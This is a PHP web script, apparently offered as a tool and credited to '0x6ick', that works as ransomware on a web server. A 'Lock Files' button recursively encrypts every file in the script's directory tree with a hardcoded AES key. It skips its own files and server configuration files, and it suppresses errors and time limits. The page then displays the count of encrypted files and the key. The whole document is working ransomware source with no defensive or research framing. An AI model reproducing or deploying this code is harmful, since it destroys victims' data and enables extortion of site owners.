<?php
// Ransomware Sederahana v1
// Encrypt semua file kecuali file penting (auto scan recursive + UI elegan)
// by 0x6ick-6ickZone

set_time_limit(0);
error_reporting(0);

$key = "6ickZoneRansomKey"; // Ganti kunci sesuai keinginan
$iv = str_repeat("\0", 16); // IV AES-128

$encryptedFiles = 0;
$locked = false;

// Fungsi enkripsi file
function encryptFile($file, $key, $iv) {
    $data = file_get_contents($file);
    if ($data === false) return false;

    // Skip file yang sudah terenkripsi
    if (substr($data, 0, 9) === "6ickZone:") {
        return false;
    }

    $encrypted = openssl_encrypt($data, 'AES-128-CBC', $key, 0, $iv);
    if ($encrypted === false) return false;

    $encrypted = "6ickZone:" . base64_encode($encrypted);
    return file_put_contents($file, $encrypted);
}

// Fungsi scan folder + encrypt rekursif
function scanAndEncrypt($dir, $key, $iv, &$count) {
    $exclude = ['encrypt.php', 'decrypt.php', basename(__FILE__), '.htaccess', '.user.ini'];

    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        if (in_array($file, $exclude)) continue;

        $path = $dir . DIRECTORY_SEPARATOR . $file;

        if (is_dir($path)) {
            scanAndEncrypt($path, $key, $iv, $count);
        } elseif (is_file($path)) {
            if (encryptFile($path, $key, $iv)) {
                $count++;
            }
        }
    }
}

// Jalankan saat tombol diklik
if (isset($_POST['lock'])) {
    $rootDir = __DIR__;
    $count = 0;
    scanAndEncrypt($rootDir, $key, $iv, $count);
    $locked = true;
    $encryptedFiles = $count;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>6ickZone Ransomware</title>
    <style>
        body {
            background: #0d0d0d;
            color: #eee;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 50px;
        }
        h1 { color: #f44336; }
        button {
            background: #f44336;
            border: none;
            padding: 15px 30px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover { background: #c62828; }
        .info { margin-top: 20px; font-size: 18px; }
        .footer { margin-top: 50px; font-size: 14px; color: #777; }
        code { background: #333; padding: 2px 6px; border-radius: 4px; }
    </style>
</head>
<body>
    <h1>6ickZone Ransomware</h1>
    <p>Auto scan & lock semua file di direktori ini dan subfolder-nya.</p>

    <?php if (!$locked): ?>
        <form method="post">
            <button type="submit" name="lock">Lock Files</button>
        </form>
    <?php else: ?>
        <div class="info">
            <p>Done! File terenkripsi: <strong><?= $encryptedFiles ?></strong></p>
            <p>Kunci untuk decrypt: <code><?= htmlspecialchars($key) ?></code></p>
        </div>
    <?php endif; ?>

    <div class="footer">by 0x6ick - 6ickZone</div>
</body>
</html>
